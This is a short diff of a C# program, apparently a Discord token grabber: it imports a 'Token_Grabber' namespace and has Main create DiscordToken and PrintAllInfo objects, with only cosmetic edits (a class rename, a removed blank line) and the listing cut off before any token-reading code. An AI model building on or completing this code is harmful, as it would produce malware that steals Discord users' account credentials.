@@ -1,13 +1,12 @@
-﻿using System.Text.RegularExpressions;
+using System.Text.RegularExpressions;
 using Token_Grabber;
 
-public class Findtoken
+public class FindToken
 {
     public static void Main()
     {
         new DiscordToken();
         new PrintAllInfo();
-
     }
 }
 public class DiscordToken
